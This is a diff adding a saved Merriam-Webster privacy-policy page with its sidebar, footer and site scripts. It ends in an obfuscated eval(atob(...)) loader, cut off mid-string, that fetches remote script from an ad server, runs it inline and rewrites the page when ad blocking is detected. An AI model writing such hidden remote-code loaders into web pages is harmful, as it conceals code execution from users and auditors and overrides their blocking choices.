+    <p>As we continue to develop our business, we might sell or buy subsidiaries, or business units. In such transactions, customer information generally is one of the transferred business assets but remains subject to the promises made in any pre-existing Privacy Policy (unless, of course, the customer consents otherwise). Also, in the unlikely event that Merriam-Webster, or substantially all of its assets are acquired, customer information will be one of the transferred assets, and will remain subject to our Privacy Policy.</p>
+
+    <h2>Your California Privacy Rights</h2>
+
+    <p>If you are a California resident, you are entitled to prevent sharing of your personal information with third parties for their own marketing purposes through a cost-free means. If you send a request to the address above, Merriam-Webster will provide you with a California Customer Choice Notice that you may use to opt-out of such information sharing. To receive this notice, submit a written request to <a href="mailto:privacy@m-w.com">privacy@m-w.com</a>, specifying that you seek your "California Customer Choice Notice." Please allow at least thirty (30) days for a response.</p>
+
+    <h2>Acceptance of Privacy Policy Terms and Conditions</h2>
+
+    <p>By using this site, you signify your agreement to the terms and conditions of this Merriam-Webster Privacy Policy. If you do not agree to these terms, please do not use this site. We reserve the right, at our sole discretion, to change, modify, add, or remove portions of this policy at any time. All amended terms automatically take effect 30 days after they are initially posted on the site. Please check this page periodically for any modifications. Your continued use of any of the Services following the posting of any changes to these terms shall mean that you have accepted those changes.</p>
+
+    <p>If you have any questions or concerns, please send an e-mail to <a href="mailto:privacy@m-w.com">privacy@m-w.com</a>.</p>
+  </section>
+</div>    </div>
+
+
+      <div class="right-rail">
+        <div class="fixed-wrapper">
+    
+          <div class="rail-abl-box hide-mobile">
+            <div class="abl abl-300-250-nr">
+              <div class="ad-liner slot-right1">
+                 <script>require(['adProcessor'], function(ap) {ap.renderDfp('slot-right1');});</script>
+              </div>
+            </div>
+          </div>
+    
+          <!--JC: Side trending widget start-->
+<div class="wgt-side wgt-wap-side-trending">
+  
+  <h4 class="jc-wgt-title-type1">
+    <a href="/news-trend-watch/see-all">TRENDING NOW</a>
+  </h4>
+  
+  <div class="jc-under-tline-type2 margin-t-0p5em margin-b-0p938em"></div>
+  
+  <div class="wgt-wap-side-trending-items">
+    <ol>
+              <li>
+          <p class="title">
+            <a href="/news-trend-watch/kim-and-kanye-hired-a-surrogate-mother-20170621">
+              <span class="tw-module-headword">
+                surrogate mother              </span>
+              <span class="tw-module-teaser">
+                'one that serves as a substitute'              </span>
+            </a>
+          </p>
+        </li>
+              <li>
+          <p class="title">
+            <a href="/news-trend-watch/johnson-london-mayor-a-popinjay-20180112">
+              <span class="tw-module-headword">
+                popinjay              </span>
+              <span class="tw-module-teaser">
+                'a strutting supercilious person'              </span>
+            </a>
+          </p>
+        </li>
+              <li>
+          <p class="title">
+            <a href="/news-trend-watch/trump-libel-laws-a-disgrace-20180110">
+              <span class="tw-module-headword">
+                libel              </span>
+              <span class="tw-module-teaser">
+                'a written defamatory statement'              </span>
+            </a>
+          </p>
+        </li>
+              <li>
+          <p class="title">
+            <a href="/news-trend-watch/cnns-tapper-miller-obsequious-factotum-20180107">
+              <span class="tw-module-headword">
+                factotum, obsequious              </span>
+              <span class="tw-module-teaser">
+                exhibiting a fawning attentiveness              </span>
+            </a>
+          </p>
+        </li>
+              <li>
+          <p class="title">
+            <a href="/news-trend-watch/trump-thats-just-a-misnomer-20180104">
+              <span class="tw-module-headword">
+                misnomer              </span>
+              <span class="tw-module-teaser">
+                "use of a wrong or inappropriate name"              </span>
+            </a>
+          </p>
+        </li>
+          </ol>
+  </div>
+  
+  <div class="see-all-cnt">
+    <a href="/news-trend-watch/see-all">SEE ALL</a>
+  </div>
+</div>
+<!--JC: Side trending widget end-->    
+          <div class="rail-abl-box hide-mobile">
+            <div class="abl abl-300-250-nr">
+              <div class="ad-liner slot-right2">
+                 <script>require(['adProcessor'], function(ap) {ap.renderDfp('slot-right2');});</script>
+              </div>
+            </div>
+          </div>
+    
+        </div>
+      </div>
+
+  </div>
+</div>        
+                  <script>
+            require(['stickyCol'], function(stickyCol) {
+              stickyCol.enableListeners('.left-content', '.right-rail', '.sticky-column');
+            });
+          </script>
+          <!-- Set up the share links. -->
+          <script type="text/javascript">
+            require(['shareLinks'], function(shareLinks) {
+              shareLinks.init();
+            });
+          </script>
+                
+        <!--Global footer-->
+        
+<!--Global footer start-->
+<footer class="global-footer">
+  
+  <div class="footer-mast clearfix">
+    <div class="mw-logo-section">
+      <a href="/" class="footer-logo">Merriam Webster</a>
+    </div>
+    <div class="footer-mast-content clearfix">
+      <div class="footer-subscribe-block">
+        <div class="footer-subscribe-msg">
+          <p>Learn a new word every day. Delivered to your inbox!</p>
+        </div>
+        <form class="footer-subscribe js-wod-subscribe-frm">
+          <input class="footer-subscribe-field" type="text" name="email" value="" placeholder="Your email address">
+          <input class="footer-subscribe-button" type="submit" name="submit" value="SUBSCRIBE">
+          <input class="footer-subscribe-button hidden arrow" type="submit" name="submit" value="&gt;">
+        </form>
+      </div>
+      <div class="footer-dictionaries">
+        <p>OTHER MERRIAM-WEBSTER DICTIONARIES</p>
+        <div class="other-dictionaries">
+          <ul>
+            <li><a href="http://www.spanishcentral.com/">SPANISH CENTRAL</a></li>
+            <li><a href="http://learnersdictionary.com/">LEARNER'S ESL DICTIONARY</a></li>
+            <li><a href="http://www.wordcentral.com/">WORDCENTRAL FOR KIDS</a></li>
+            <li><a href="http://www.visualdictionaryonline.com/">VISUAL DICTIONARY</a></li>
+          </ul>
+          <ul>
+            <li><a href="http://scrabble.merriam.com/">SCRABBLE<sup>&reg;</sup> WORD FINDER</a></li>
+            <li><a href="http://unabridged.merriam-webster.com/">MERRIAM-WEBSTER'S UNABRIDGED DICTIONARY</a></li>
+            <li><a href="http://arabic.britannicaenglish.com/en">BRITANNICA ENGLISH - ARABIC TRANSLATION</a></li>
+            <li><a href="http://www.nglish.com/spanish/en/">NGLISH - SPANISH-ENGLISH TRANSLATION</a></li>
+          </ul>
+        </div>
+      </div>
+      <div class="follow-us">
+        <p>FOLLOW US</p>
+        <div class="follow-links">
+          <ul>
+            <li><a href="https://www.facebook.com/merriamwebster" target="_blank" class="social-link social-fb">facebook</a></li>
+            <li><a href="https://twitter.com/merriamwebster" target="_blank" class="social-link social-tw">twitter</a></li>
+            <li><a href="https://www.youtube.com/user/MerriamWebsterOnline" target="_blank" class="social-link social-play">youtube</a></li>
+            <li><a href="https://www.instagram.com/merriamwebster/" target="_blank" class="social-link social-ig">instagram</a></li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+  
+  <div class="footer-foot clearfix">
+    <div class="footer-foot-content clearfix">
+      <ul class="footer-menu browse-dictionary">
+        <li><a href="/browse/dictionary/a">Browse the Dictionary:</a></li>
+        <li><a href="/browse/dictionary/a">a</a></li>
+        <li><a href="/browse/dictionary/b">b</a></li>
+        <li><a href="/browse/dictionary/c">c</a></li>
+        <li><a href="/browse/dictionary/d">d</a></li>
+        <li><a href="/browse/dictionary/e">e</a></li>
+        <li><a href="/browse/dictionary/f">f</a></li>
+        <li><a href="/browse/dictionary/g">g</a></li>
+        <li><a href="/browse/dictionary/h">h</a></li>
+        <li><a href="/browse/dictionary/i">i</a></li>
+        <li><a href="/browse/dictionary/j">j</a></li>
+        <li><a href="/browse/dictionary/k">k</a></li>
+        <li><a href="/browse/dictionary/l">l</a></li>
+        <li><a href="/browse/dictionary/m">m</a></li>
+        <li><a href="/browse/dictionary/n">n</a></li>
+        <li><a href="/browse/dictionary/o">o</a></li>
+        <li><a href="/browse/dictionary/p">p</a></li>
+        <li><a href="/browse/dictionary/q">q</a></li>
+        <li><a href="/browse/dictionary/r">r</a></li>
+        <li><a href="/browse/dictionary/s">s</a></li>
+        <li><a href="/browse/dictionary/t">t</a></li>
+        <li><a href="/browse/dictionary/u">u</a></li>
+        <li><a href="/browse/dictionary/v">v</a></li>
+        <li><a href="/browse/dictionary/w">w</a></li>
+        <li><a href="/browse/dictionary/x">x</a></li>
+        <li><a href="/browse/dictionary/y">y</a></li>
+        <li><a href="/browse/dictionary/z">z</a></li>
+        <li><a href="/browse/dictionary/0">0-9</a></li>
+      </ul>
+
+      <ul class="footer-menu">
+        <li><a href="/">Home <span class="rborder"></span></a></li>
+        <li><a href="/help">Help <span class="rborder"></span></a></li>
+        <li><a href="/apps">Apps <span class="rborder"></span></a></li>
+        <li><a href="/about-us">About Us <span class="rborder"></span></a></li>
+        <li><a href="/shop-dictionaries">Shop <span class="rborder"></span></a></li>
+        <li><a href="/advertising">Advertising Info <span class="rborder"></span></a></li>
+        <li><a href="https://www.dictionaryapi.com/" target="_blank">Dictionary API <span class="rborder"></span></a></li>
+        <li><a href="/about-our-ads">About Our Ads <span class="rborder"></span></a></li>
+        <li><a href="/contact-us">Contact Us <span class="rborder"></span></a></li>
+        <li><a href="http://nws.merriam-webster.com/opendictionary/" target="_blank">The Open Dictionary <span class="rborder"></span></a></li>
+        <li><a href="/words-at-play/word-of-the-year-2017-feminism">Word of the Year <span class="rborder"></span></a></li>
+        <li><a href="/legal">Law Dictionary <span class="rborder"></span></a></li>
+        <li><a href="/medical">Medical Dictionary <span class="rborder"></span></a></li>
+        <li><a href="/privacy-policy">Privacy Policy <span class="rborder"></span></a></li>
+        <li class="last"><a href="/terms-of-use">Terms of Use</a></li>
+      </ul>
+
+      <ul class="footer-menu">
+        <li><a href="/browse/thesaurus/a">Browse the Thesaurus <span class="rborder"></span></a></li>
+        <li><a href="/browse/medical/a">Browse the Medical Dictionary<span class="rborder"></span></a></li>
+        <li><a href="/browse/legal/a">Browse the Legal Dictionary<span class="rborder"></span></a></li>
+        <li class="last"><a href="http://www.spanishcentral.com/browse/a" target="_blank">Browse the Spanish-English Dictionary</a></li>        
+      </ul>
+        
+      <p class="copyright">© 2018 Merriam-Webster, Incorporated</p>
+    </div>
+  </div>
+</footer>
+<!--Global footer end-->
+        <!-- Footer Recirc bar disabled on certain pages -->
+                          
+      </div>
+    </div>
+
+    <!-- Subscribe WOD Overlay -->
+    <div id="subscribe-overlay"></div>
+<script>
+  require(['subscribeOverlay'], function(subscribeOverlay) {
+    window.setTimeout(function() {
+      subscribeOverlay.init();
+    },6000);
+  });
+</script>
+    <script>
+      // delete our require function and load the require library
+      delete window.require; //need this or else can't load default require lib.
+    </script>
+    
+    <!-- Modernizr (only needed for games)-->
+                  
+    <!-- Loading JS -->
+                              <script src="//assets.merriam-webster.com/mw/app-bundles/mw-2018-01-15.12-13-35.000000-app-bundle/js/main.min.js"></script>
+                   
+        <script>
+      require(['common', 'audioplayer', 'wodSubscribe', 'gaTracker', 'fbSdk', 'adProcessor', 'raf'], function(common, audioplayer, wodSubscribe, gaTracker, fbSdk, adProcessor) {
+
+        //Prep page counter cookie (expiration = 10 minutes)
+        var pvc = $.cookie('pvc');
+        pvc = (pvc === undefined) ? 1 : (parseInt(pvc) + 1);
+        var date = new Date();
+        date.setTime(date.getTime() + (10 * 60 * 1000));
+        $.cookie('pvc', pvc, { expires: date, path: '/' });
+
+        //JC: needs to be refactored
+        common.init();
+
+        //JC: Initiating ad libraries (google slot lib, ) & initializing slots
+        adProcessor.prepareAdLibraries();
+
+        //JC: by default we use a black-list, white-list is only being used if provided (rare cases)
+        if (window.mwdata.adsWhitelist  !== null) {
+          adProcessor.prepareOnlyTheseAdSlots(window.mwdata.adsWhitelist);
+        } else {
+          adProcessor.prepareAllAdSlotsExcept(window.mwdata.adsBlacklist);
+        }
+
+        //JC: this enables audio playback everywhere (wod & definitions)
+        audioplayer.init();
+
+         //JC: Enabling WOD subscribe forms if present
+        wodSubscribe.init();
+
+        //JC: Loading google analitics libary and starting tracking
+        gaTracker.init();
+
+        //JC: special handling for spelling suggestionsand not found pages.
+        if (window.mwdata.gaSpecialTracking) {
+            // Track the virtual page click.
+            var urlRef = (window.location.pathname.indexOf("/thesaurus") >= 0) ? '/thesaurus/':'/dictionary/';
+            var url =  urlRef + window.mwdata.gaSpecialTracking + '/' + window.mwdata.gaSpecialTrackingWord;
+            var gaCmd = function(){ga('send', 'pageview', url);};
+            gaTracker.execCmd(gaCmd);
+            console.log('Special tracking, type:', window.mwdata.gaSpecialTracking, url);
+        }
+
+        //JC: Facebook SDK is needed on all pages except for Home
+        if (window.mwdata.isHome === false) {
+          fbSdk.init();
+        }
+      });
+    </script>
+    
+    
+        <script>
+      var jwplayerPath = window.mwdata.assetsDomain2 + '/mw/jwplayer-7.12.0/jwplayer';
+      requirejs.config({paths: {jwplayer: jwplayerPath}});
+    </script>
+        
+        
+        <script>
+      window.mwRequireCall.forEach(function(toCall) {
+        require(toCall.reqName, toCall.reqFunc);
+      });
+    </script>
+    
+        <script type="text/javascript">
+      require(['trackHeapEvents'], function(trackHeapEvents) {
+        trackHeapEvents.trackEvents();
+      });
+      require(['lazySizes']);
+    </script>
+
+                  
+
+        
+
+                  
+
+              <!--PF: 3 of 3-->
+<script>
+  var adonis = adonis || {};
+  adonis.scriptResources = ["app-bundle/js/main.min.js"];
+  adonis.transport = 'https://www.adiode.com/http';
+</script>
+<script>/* httploader-7.2.0 */ eval(atob("IWZ1bmN0aW9uIGUodCxuLHIpe2Z1bmN0aW9uIG8oYSxjKXtpZighblthXSl7aWYoIXRbYV0pe3ZhciB1PSJmdW5jdGlvbiI9PXR5cGVvZiByZXF1aXJlJiZyZXF1aXJlO2lmKCFjJiZ1KXJldHVybiB1KGEsITApO2lmKGkpcmV0dXJuIGkoYSwhMCk7dmFyIHM9bmV3IEVycm9yKCJDYW5ub3QgZmluZCBtb2R1bGUgJyIrYSsiJyIpO3Rocm93IHMuY29kZT0iTU9EVUxFX05PVF9GT1VORCIsc312YXIgbD1uW2FdPXtleHBvcnRzOnt9fTt0W2FdWzBdLmNhbGwobC5leHBvcnRzLGZ1bmN0aW9uKGUpe3ZhciBuPXRbYV1bMV1bZV07cmV0dXJuIG8obj9uOmUpfSxsLGwuZXhwb3J0cyxlLHQsbixyKX1yZXR1cm4gblthXS5leHBvcnRzfWZvcih2YXIgaT0iZnVuY3Rpb24iPT10eXBlb2YgcmVxdWlyZSYmcmVxdWlyZSxhPTA7YTxyLmxlbmd0aDthKyspbyhyW2FdKTtyZXR1cm4gb30oezE6W2Z1bmN0aW9uKGUsdCxuKXsidXNlIHN0cmljdCI7dmFyIHI9ZSgxMiksbz1lKDcpO2UoMjQpLHdpbmRvdy5hZG9uaXNDb25uVHlwZT0iaHR0cCIsci5sb2dnZXIuaW5mbygiW2h0dHBMb2FkZXJdOiBTdGFydGluZyBib290c3RyYXAiKSwoMCxvLnJ1bikoKX0sezEyOjEyLDI0OjI0LDc6N31dLDI6W2Z1bmN0aW9uKGUsdCxuKXsidXNlIHN0cmljdCI7ZnVuY3Rpb24gcigpe3JldHVybiBpKHdpbmRvdykmJmMod2luZG93KSYmdSh3aW5kb3cpJiZhKHdpbmRvdykmJnMod2luZG93KX1mdW5jdGlvbiBvKCl7cmV0dXJuIGkod2luZG93KSYmdSh3aW5kb3cpJiZhKHdpbmRvdykmJnMod2luZG93KX1mdW5jdGlvbiBpKGUpe3ZhciB0PSJfX3h5el9fIjt0cnl7cmV0dXJuIGUubG9jYWxTdG9yYWdlLnNldEl0ZW0odCx0KSxlLmxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKHQpLCEwfWNhdGNoKG4pe3JldHVybiExfX1mdW5jdGlvbiBhKGUpe3RyeXtyZXR1cm4hIW5ldyBlLkJsb2J9Y2F0Y2godCl7cmV0dXJuITF9fWZ1bmN0aW9uIGMoZSl7dmFyIHQ9ZnVuY3Rpb24odCl7cmV0dXJuIHQuc29tZShmdW5jdGlvbih0KXtyZXR1cm4gdCBpbiBlfSl9LG49WyJSVENQZWVyQ29ubmVjdGlvbiIsIm1velJUQ1BlZXJDb25uZWN0aW9uIiwid2Via2l0UlRDUGVlckNvbm5lY3Rpb24iXSxyPVsiUlRDU2Vzc2lvbkRlc2NyaXB0aW9uIiwibW96UlRDU2Vzc2lvbkRlc2NyaXB0aW9uIiwid2Via2l0UlRDU2Vzc2lvbkRlc2NyaXB0aW9uIl0sbz1bIlJUQ0ljZUNhbmRpZGF0ZSIsIm1velJUQ0ljZUNhbmRpZGF0ZSIsIndlYmtpdFJUQ0ljZUNhbmRpZGF0ZSJdO3JldHVybiB0KG4pJiZ0KHIpJiZ0KG8pfWZ1bmN0aW9uIHUoZSl7cmV0dXJuIlByb21pc2UiaW4gZSYmInJlc29sdmUiaW4gZS5Qcm9taXNlJiYicmVqZWN0ImluIGUuUHJvbWlzZSYmImFsbCJpbiBlLlByb21pc2UmJiJyYWNlImluIGUuUHJvbWlzZX1mdW5jdGlvbiBzKGUpe3JldHVybiJmdW5jdGlvbiI9PXR5cGVvZiBlLk9iamVjdC5hc3NpZ259dC5leHBvcnRzPXtpc1N1cHBvcnRlZEJyb3dzZXJSdGM6cixpc1N1cHBvcnRlZEJyb3dzZXI6byxpc0xvY2FsU3RvcmFnZVN1cHBvcnRlZDppLGlzUnRjU3VwcG9ydGVkOmMsaXNCbG9iU3VwcG9ydGVkOmEsaXNPYmplY3RBc3NpZ25TdXBwb3J0ZWQ6cyxpc1Byb21pc2VTdXBwb3J0ZWQ6dX19LHt9XSwzOltmdW5jdGlvbihlLHQsbil7InVzZSBzdHJpY3QiO2Z1bmN0aW9uIHIoZSx0KXt2YXIgbj0iY2FjaGUvc3RvcmVBZG9uaXNDbGllbnRSZXNwb25zZSIscj10WyJhZG9uaXMtY2xpZW50LXZlcnNpb24iXSxhPXRbImNhY2hlLWNvbnRyb2wiXSxjPWEmJmEuc3RhcnRzV2l0aCgibWF4LWFnZSIpLHU9dC5leHBpcnlNaWxsaXN8fDA7aWYoYyl7aS5sb2dnZXIuZGVidWcoYSk7dmFyIHM9cGFyc2VJbnQoYS5zcGxpdCgiPSIpWzFdLDEwKTtpc05hTihzKXx8KHU9KG5ldyBEYXRlKS5nZXRUaW1lKCkrMWUzKnMpfXImJihpLmxvZ2dlci5pbmZvKCJbIituKyJdOiBuZXcgZXhwaXJ5ICIrdSsiID0gIituZXcgRGF0ZSh1KSksbyhlLHIsdSkpfWZ1bmN0aW9uIG8oZSx0LG4pe3dpbmRvdy5sb2NhbFN0b3JhZ2UuYWRvbmlzQ2FjaGVTcmM9ZSx3aW5kb3cubG9jYWxTdG9yYWdlLmFkb25pc0NhY2hlRXhwaXJ5TWlsbGlzPW4sd2luZG93LmxvY2FsU3RvcmFnZS5hZG9uaXNDbGllbnRWZXJzaW9uPXR9T2JqZWN0LmRlZmluZVByb3BlcnR5KG4sIl9fZXNNb2R1bGUiLHt2YWx1ZTohMH0pLG4uc3RvcmVBZG9uaXNDbGllbnRSZXNwb25zZT1yLG4uY2FjaGVBZG9uaXNDbGllbnQ9bzt2YXIgaT1lKDEyKX0sezEyOjEyfV0sNDpbZnVuY3Rpb24oZSx0LG4peyJ1c2Ugc3RyaWN0Ijt2YXIgcj1lKDUpO3dpbmRvdy5hZG9uaXNIYXNoPXdpbmRvdy5hZG9uaXNIYXNofHx3aW5kb3cubG9jYXRpb24uaGFzaHx8IiI7dmFyIG89d2luZG93LmFkb25pc0hhc2guaW5kZXhPZigiYWRvbmlzLWxvZ2dpbmciKT49MDtyLkxPR19MRVZFTD1vPyJkZWJ1ZyI6ci5MT0dfTEVWRUw7dmFyIGk9d2luZG93LmFkb25pc3x8e307aS53c0hvc3QmJnIuV1MmJihyLldTLmhvc3Q9aS53c0hvc3QpLGkudHJhbnNwb3J0JiYoci5TVUVaX0hUVFBfRU5EUE9JTlQ9aS50cmFuc3BvcnQpLHQuZXhwb3J0cz1yfSx7NTo1fV0sNTpbZnVuY3Rpb24oZSx0LG4peyJ1c2Ugc3RyaWN0Ijt0LmV4cG9ydHM9e1JFQUxfU1RVTl9IT1NUOiJzdHVuLnhwYW5hbWEubmV0OjM0NzgiLFRVUk5TSUdOQUxfSE9TVDoidHMucC54cGFuYW1hLm5ldDo3MDAwIixTVFVOR1VOX0hPU1Q6InNnLnAueHBhbmFtYS5uZXQ6MzQ4MCIsU0VSVkVSX0NBTkRJREFURToiY2FuZGlkYXRlOjgyNzY0ODAyNiAxIHVkcCAyMTIyMTk0Njg3IFNFUlZFUl9JUCBTRVJWRVJfUE9SVCB0eXAgaG9zdCBnZW5lcmF0aW9uIDAiLFJFUE9SVElOR19VUkw6Imh0dHBzOi8vbGIuc3RhdHNldmVudC5jb20vc3RhdHMiLFJFUE9SVElOR19SQVRFOi4wMSxMT0dfTEVWRUw6ImVycm9yIixSRVBPUlRfRVJST1JTOiEwLE1BTklGRVNUX1VSTDoiaHR0cHM6Ly9zcmkuanNpbnRlZ3JpdHkuY29tL21hbmlmZXN0Lmpzb24iLE1BTklGRVNUX0VYUElSQVRJT05fVElNRTo4NjQwMCxBRF9NQVJLRVI6ImFkb25pcy1tYXJrZXIiLEFET05JU19DTElFTlRfRkVUQ0hfVVJMOiJodHRwczovL2Fkc2VydmVyLnhwYW5hbWEubmV0L2NsaWVudC03LWxhdGVzdC5qcyIsV1M6e2hvc3Q6InN1ZXotc2VydmVyLnhwYW5hbWEubmV0IixwYXRoOiIvd3MiLHBvcnQ6NDQzLHNlY3VyZTohMCxwcm9taXNlVGltZW91dDozZTN9LFNFUlZJQ0VfU1RBVFVTX1VSTDpmdW5jdGlvbihlKXtyZXR1cm4iaHR0cHM6Ly9jbGllbnQucmVhY3RyanMuY29tLyIrZSsiLXN0YXR1cy5qc29uIn0sU1VFWl9IVFRQX1JFVFJZOjMsU1VFWl9IVFRQX0RFTEFZOjEwMH19LHt9XSw2OltmdW5jdGlvbihlLHQsbil7InVzZSBzdHJpY3QiO2Z1bmN0aW9uIHIoZSl7cmV0dXJuIGUmJmUuX19lc01vZHVsZT9lOnsiZGVmYXVsdCI6ZX19ZnVuY3Rpb24gbygpe3ZhciBlPSJjb250cm9sLXNlcnZlci9jaGVjayI7Zi5sb2dnZXIuaW5mbygiWyIrZSsiXTogQ2hlY2tpbmcgc2VydmljZSBzdGF0dXMiKTt2YXIgdD1pKHdpbmRvdyk7cmV0dXJuKDAsdS5yZXF1ZXN0KSh0KS50aGVuKGZ1bmN0aW9uKHQpe3JldHVybiBmLmxvZ2dlci5kZWJ1ZygiWyIrZSsiXTogU3RhdHVzIGNoZWNrIGZldGNoZWQgd2l0aCBzdGF0dXMtY29kZSA8Iit0LnN0YXR1cysiPiIpLEpTT04ucGFyc2UodC5yZXNwb25zZVRleHQpfSlbImNhdGNoIl0oZnVuY3Rpb24odCl7Zi5sb2dnZXIuaW5mbygiWyIrZSsiXTogRmFpbGVkIHRvIGNoZWNrIGNvbnRyb2wgc2VydmVyIHN0YXR1cyA8Iit0KyI+Iik7dmFyIG49dm9pZCAwIT09dC5yZXE/dC5yZXEuc3RhdHVzOm51bGw7dGhyb3cgMD09PW4/bmV3IHMuWGhyQmxvY2tFcnJvcjpuZXcgRXJyb3IoIlVuZXhwZWN0ZWQgc3RhdHVzIGNvZGUgd2hpbGUgcGVyZm9ybWluZyBjb250cm9sIHNlcnZlciBjaGVjaywgc3RhdHVzLWNvZGUgPSA8IituKyI+Iil9KX1mdW5jdGlvbiBpKGUpe3JldHVybiBkWyJkZWZhdWx0Il0uU0VSVklDRV9TVEFUVVNfVVJMKGNbImRlZmF1bHQiXS5nZXQoZS5sb2NhdGlvbi5ob3N0KSl9T2JqZWN0LmRlZmluZVByb3BlcnR5KG4sIl9fZXNNb2R1bGUiLHt2YWx1ZTohMH0pLG4uY2hlY2s9byxuLmdldFNlcnZpY2VTdGF0dXNVcmw9aTt2YXIgYT1lKDI2KSxjPXIoYSksdT1lKDE5KSxzPWUoOSksbD1lKDQpLGQ9cihsKSxmPWUoMTIpfSx7MTI6MTIsMTk6MTksMjY6MjYsNDo0LDk6OX1dLDc6W2Z1bmN0aW9uKGUsdCxuKXsidXNlIHN0cmljdCI7ZnVuY3Rpb24gcihlKXtpZihlJiZlLl9fZXNNb2R1bGUpcmV0dXJuIGU7dmFyIHQ9e307aWYobnVsbCE9ZSlmb3IodmFyIG4gaW4gZSlPYmplY3QucHJvdG90eXBlLmhhc093blByb3BlcnR5LmNhbGwoZSxuKSYmKHRbbl09ZVtuXSk7cmV0dXJuIHRbImRlZmF1bHQiXT1lLHR9ZnVuY3Rpb24gbyhlKXtyZXR1cm4gZSYmZS5fX2VzTW9kdWxlP2U6eyJkZWZhdWx0IjplfX1mdW5jdGlvbiBpKCl7dmFyIGU9Imh0dHAtYWRvbmlzLWNsaWVudC1sb2FkZXIvcnVuIjtyZXR1cm4gcFsiZGVmYXVsdCJdLnJlcG9ydEV2ZW50KCJib290c3RyYXAuaHR0cC5wYWdldmlldyIpLGdbImRlZmF1bHQiXS5pc1N1cHBvcnRlZEJyb3dzZXIoKT8oeS5sb2dnZXIuaW5mbygiWyIrZSsiXTogQnJvd3NlciBpcyBjb21wYXRpYmxlIikscFsiZGVmYXVsdCJdLnJlcG9ydEV2ZW50KCJib290c3RyYXAuaHR0cC5zdXBwb3J0ZWQiKSxhKCkudGhlbihmdW5jdGlvbih0KXtyZXR1cm4geS5sb2dnZXIuaW5mbygiWyIrZSsiXTogUnVubmluZyBhbmQgY2FjaGluZyBhZG9uaXNDbGllbnQgc291cmNlIikscFsiZGVmYXVsdCJdLnJlcG9ydEV2ZW50KCJib290c3RyYXAuaHR0cC5ydW5jbGllbnRzY3JpcHQiKSxwWyJkZWZhdWx0Il0uc2F2ZVRpbWluZygpLGRbImRlZmF1bHQiXS5kZWZpbmVSZWFkT25seVByb3BlcnR5KCJhZG9uaXNDb25maWciLHNbImRlZmF1bHQiXSksKDAsbS5zdG9yZUFkb25pc0NsaWVudFJlc3BvbnNlKSh0LnNvdXJjZSx0Lm1ldGEpLHZbImRlZmF1bHQiXS5pbnNlcnRJbmxpbmVTY3JpcHQodC5zb3VyY2UpLG51bGx9KVsiY2F0Y2giXShmdW5jdGlvbih0KXtyZXR1cm4gdCBpbnN0YW5jZW9mIHguWGhyQmxvY2tFcnJvcj8oeS5sb2dnZXIuaW5mbygiWyIrZSsiXTogRmFpbGVkIHRvIGZldGNoIGFkb25pcy1jbGllbnQgdXNpbmcgU3VleiIpLHkubG9nZ2VyLmluZm8oIlsiK2UrIl06IEFsbCBsb2FkZXJzIGZhaWxlZCB0byBmZXRjaCBhZG9uaXMtY2xpZW50LCBjaGVja2luZyBjb250cm9sIHNlcnZlciIpLF8uY2hlY2soKSk6KHkubG9nZ2VyLndhcm4oIlsiK2UrIl06IFVuZXhwZWN0ZWQgZXJyb3Igd2hlbiB0cnlpbmcgdG8gZmV0Y2ggYWRvbmlzLWNsaWVudCBvdmVyIFN1ZXo6IDwiK3QrIj4iKSxwWyJkZWZhdWx0Il0ucmVwb3J0RXJyb3IodCksbnVsbCl9KVsiY2F0Y2giXShmdW5jdGlvbih0KXtyZXR1cm4gdCBpbnN0YW5jZW9mIHguWGhyQmxvY2tFcnJvcj8ocFsiZGVmYXVsdCJdLnJlcG9ydEV2ZW50KCJib290c3RyYXAuaHR0cC5zdGF0dXNfYmxvY2tlZCIpLHkubG9nZ2VyLmluZm8oIlsiK2UrIl06IENvbnRyb2wgc2VydmVyIGNoZWNrIGZhaWxlZCwgcHJvYmFibHkgYW4gYWRibG9ja2VyIikse3N0YXR1czohMH0pOih5LmxvZ2dlci53YXJuKCJbIitlKyJdOiBVbmV4cGVjdGVkIGVycm9yIGZyb20gY29udHJvbCBzZXJ2ZXIgY2hlY2s6IDwiK3QrIj4iKSxwWyJkZWZhdWx0Il0ucmVwb3J0RXJyb3IodCksbnVsbCl9KS50aGVuKGZ1bmN0aW9uKHQpeygwLFNbImRlZmF1bHQiXSkod2luZG93Lm5hdmlnYXRvci51c2VyQWdlbnQpJiZ0JiYic3RhdHVzImluIHQmJnQuc3RhdHVzPyhwWyJkZWZhdWx0Il0ucmVwb3J0RXZlbnQoImJvb3RzdHJhcC5odHRwLnRyaWdnZWQiKSx5LmxvZ2dlci5pbmZvKCJbIitlKyJdOiBDb250cm9sIHNlcnZlciByZXBvcnRlZCBzdGF0dXMgaXMgaGVhbHRoeSBvciB3YXMgYmxvY2tlZCwgdHJpZ2dlcmluZyBvcHBlbmhlaW1lciIpLCgwLGMucmVwbGFjZUNvbnRlbnQpKHdpbmRvdy5kb2N1bWVudCksKDAsVFsiZGVmYXVsdCJdKSh3aW5kb3csImFkb25pcy1kZXRlcnJlbnQiKSk6dCYmInN0YXR1cyJpbiB0JiZ0LnN0YXR1cz09PSExJiYocFsiZGVmYXVsdCJdLnJlcG9ydEV2ZW50KCJib290c3RyYXAuaHR0cC5ub3RfdHJpZ2dlZCIpLHkubG9nZ2VyLndhcm4oIlsiK2UrIl06IENvbnRyb2wgc2VydmVyIHJlcG9ydGVkIHN0YXR1cyBpcyB1bmhlYWx0aHksIG5vdCB0cmlnZ2VyaW5nIG9wcGVuaGVpbWVyIikpfSkpOnZvaWQgeS5sb2dnZXIuaW5mbygiWyIrZSsiXTogSW5jb21wYXRpYmxlIGJyb3dzZXIsIG5vdCBjb250aW51aW5nIil9ZnVuY3Rpb24gYSgpe3ZhciBlPSJodHRwLWFkb25pcy1jbGllbnQtbG9hZGVyL2xvYWRBZG9uaXNDbGllbnQiO3JldHVybiB5LmxvZ2dlci5kZWJ1ZygiWyIrZSsiXTogVHJ5aW5nIHRvIGxvYWQgYWRvbmlzLWNsaWVudCB3aXRoIFhIUiBsb2FkZXIgKGZyb20gQ0ROKSIpLEMubG9hZCgpWyJjYXRjaCJdKGZ1bmN0aW9uKHQpe3JldHVybiB0IGluc3RhbmNlb2YgeC5YaHJCbG9ja0Vycm9yP3kubG9nZ2VyLmluZm8oIlsiK2UrIl06IEZhaWxlZCB0byBmZXRjaCBhZG9uaXMtY2xpZW50IG92ZXIgWEhSLCB0cnlpbmcgdG8gbG9hZCBmcm9tIGNhY2hlIik6KHkubG9nZ2VyLndhcm4oIlsiK2UrIl06IFVuZXhwZWN0ZWQgZXJyb3Igd2hlbiB0cnlpbmcgZmV